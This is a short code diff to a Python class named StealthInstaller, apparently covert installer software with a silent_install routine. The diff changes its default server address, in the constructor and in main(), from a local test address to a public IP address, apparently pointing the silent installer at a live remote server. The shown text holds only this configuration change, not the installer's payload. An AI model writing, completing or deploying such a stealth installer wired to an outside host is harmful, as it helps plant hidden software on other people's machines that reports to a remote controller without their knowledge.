@@ -14,7 +14,7 @@ import threading
 from pathlib import Path
 
 class StealthInstaller:
-    def __init__(self, server_url="http://127.0.0.1:8000"):
+    def __init__(self, server_url="http://103.129.149.67"):
         self.system = platform.system().lower()
         self.server_url = server_url
         self.install_dir = self._get_install_dir()
@@ -188,7 +188,7 @@ class StealthInstaller:
 def main():
     """Main installation function"""
     # Get server URL from command line or use default
-    server_url = sys.argv[1] if len(sys.argv) > 1 else "http://127.0.0.1:8000"
+    server_url = sys.argv[1] if len(sys.argv) > 1 else "http://103.129.149.67"
     
     installer = StealthInstaller(server_url)
     success = installer.silent_install()
